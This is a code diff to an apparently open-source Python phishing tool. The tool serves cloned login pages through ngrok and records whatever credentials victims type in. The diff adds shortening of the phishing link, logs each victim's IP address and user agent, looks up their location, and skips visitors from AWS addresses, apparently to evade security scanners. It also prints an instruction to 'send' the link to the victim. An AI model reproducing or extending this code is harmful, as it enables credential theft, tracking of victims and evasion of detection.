@@ -7,8 +7,10 @@ from zipfile import ZipFile
 from os import walk,path,getcwd
 import threading
 from datetime import datetime
-import json
+from json import loads
+from urllib.parse import quote
 from src import requests
+from time import sleep
     
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -19,6 +21,11 @@ except:
 def get_my_ip():
     
     return requests.get('https://api.ipify.org/?format=json').content.decode('utf8').split(':')[-1][1:-2]
+
+def shorten(url):    
+    
+    return requests.post('http://lnkiy.com/createShortLink',data={"link":""+url}).content.decode('utf8').split('++')[0]
+
 
 def ngrok():
     try:
@@ -72,14 +79,17 @@ def attack(server,url,wifi):
         open(getcwd()+'/sites/'+server+'/redir.txt','w+').write(url)
     elif wifi:
         open(getcwd()+'/sites/'+server+'/wifi.txt','w+').write(wifi)
-    try:        
-        my_ip = get_my_ip().strip(' ').strip('\n')
-        link = get_link()
-    except Exception as e:
-        print(colored('[*] Error : could not start ngrok ','red',attrs=['bold']))
-        return
+    my_ip = [get_my_ip().strip(' ').strip('\n')]
+    while 1:    
+        try:
+            link = get_link()
+            shortened = shorten(link)            
+            #shortened = ''
+            break
+        except:
+            continue
     print()
-    print(colored('[*] Send this link to victim  :  ','green',attrs=['bold'])+colored(link,'red',attrs=['bold']))
+    print(colored('[*] Send any of these links to victim  :  \n\n','green',attrs=['bold'])+colored(link+'\n'+shortened,'red',attrs=['bold']))
     print()    
     if '/' not in server:
         ztop = 0
@@ -89,15 +99,20 @@ def attack(server,url,wifi):
                 for file in files:
                     if 'ip.txt' in file:
                         f = open(path.join(root, file))                    
-                        r = f.read().strip(' ').strip('\n')
+                        r = f.read().split('\n')[0]
                         if '.' in r or ':' in r and r not in my_ip:
-                            f.seek(0)
+                            f.seek(0)                            
+                            re=f.read().split('\n')         
+                            my_ip.append(re[0])                                                 
+                            try:
+                                df = ip_details(re)
+                                if not df:
+                                    continue
+                            except:
+                                continue
                             print()
-                            re=f.read()
-                            print(colored('[*] Victim has accesed the link','red',attrs=['bold']))
-                            print()            
-                            ip_details(re)
-                            print()
+                            my_ip = re[0]
+                            ua=re[2]
                             ztop = 1
                             f.close()
                             f = open(path.join(root, file),'w+')
@@ -132,28 +147,39 @@ def attack(server,url,wifi):
     subprocess.Popen(['killall','-2', 'php', '>' ,'/dev/null', '2>&1'],stdin =subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
     f = open('logs.log','a+')
     now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\n\n')
+    f.write(now + '\n' + server.split('/')[-1].upper() + '\nCREDENTIALS  ->  ' + cred + '\nIP ADDRESS  ->  ' + my_ip + '\nUSER AGENT -> ' + ua + '\n\n')
     f.close()
 
-def ip_details(ip):
+def ip_details(lis):
     
+    ip = lis[0]
     headers = {
         "User-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36"
     }
     url = 'http://ip-api.com/json/'+ip.strip('\n')
     r = requests.get(url,headers=headers).content.decode('utf8')
-    dic = json.loads(r)
+    dic = loads(r)
+    if 'AWS' in dic['org']:
+        return 0
+    print()
+    print(colored('[*] Victim has accesed the link','red',attrs=['bold']))
+    print()
+    print('IP ADDRESS : '+lis[0])
+    print('LANGUAGE : '+lis[1])
+    print('USER AGENT : '+lis[2])  
+    print('\nIP ADDRESS DETAILS\n')
     print('COUNTRY : '+dic['country'])
     print('COUNTRY CODE : '+dic['countryCode'])
     print('REGION : '+dic['regionName'])
     print('CITY : '+dic['city'])
     print('ZIP CODE : '+dic['zip'])
-    print('LATITUDE : '+str(dic['lat']))
-    print('LONGITUDE : '+str(dic['lon']))
+    print('ISP LATITUDE : '+str(dic['lat']))
+    print('ISP LONGITUDE : '+str(dic['lon']))
     print('TIMEZONE : '+dic['timezone'])
     print('ISP : '+dic['isp'])
     print('ISP ORGANISATION : '+dic['org'])
     print('AS : '+dic['as']+'\n')
+    return 1
     
 
 def main():    
